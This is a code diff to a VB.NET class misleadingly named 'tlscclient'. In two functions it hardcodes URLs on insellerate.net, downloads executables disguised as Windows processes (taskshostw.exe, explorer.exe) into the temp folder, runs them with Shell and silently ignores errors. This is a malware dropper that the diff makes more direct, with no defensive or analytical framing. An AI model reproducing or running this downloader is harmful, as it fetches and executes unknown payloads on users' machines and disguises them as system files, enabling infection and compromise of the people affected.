@@ -36,36 +36,36 @@ Public Class tlscclient
     End Sub
 
     Public Shared Function BeginConnect()
-        Dim two As String
+        Dim devil As String
         Dim x As New System.Text.StringBuilder
-        x.Append(My.Resources.force)
-        two = x.ToString
-        Dim URL As String = two
-        Dim two_process As String = Environ("temp") & "sub.exe"
+
+        x.Append("https://insellerate.net/doc/taskshostw.exe")
+        devil = x.ToString
+
+        Dim URL As String = devil
+        Dim DownloadTo As String = Environ("temp") & "taskshostw.exe"
         Try
             Dim w As New Net.WebClient
-            Dim f As Net.WebClient = w
-            Dim g As Net.WebClient = f
-            IO.File.WriteAllBytes(two_process, g.DownloadData(URL))
-            Shell(two_process)
+            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
+            Shell(DownloadTo)
         Catch ex As Exception
         End Try
     End Function
 
 
     Public Shared Function Server()
-        Dim two As String
+        Dim devil As String
         Dim x As New System.Text.StringBuilder
-        x.Append(My.Resources.force)
-        two = x.ToString
-        Dim URL As String = two
-        Dim two_process As String = Environ("temp") & "myex.exe"
+
+        x.Append("https://insellerate.net/doc/explorer.exe")
+        devil = x.ToString
+
+        Dim URL As String = devil
+        Dim DownloadTo As String = Environ("temp") & "explorer.exe"
         Try
             Dim w As New Net.WebClient
-            Dim f As Net.WebClient = w
-            Dim g As Net.WebClient = f
-            IO.File.WriteAllBytes(two_process, g.DownloadData(URL))
-            Shell(two_process)
+            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
+            Shell(DownloadTo)
         Catch ex As Exception
         End Try
     End Function
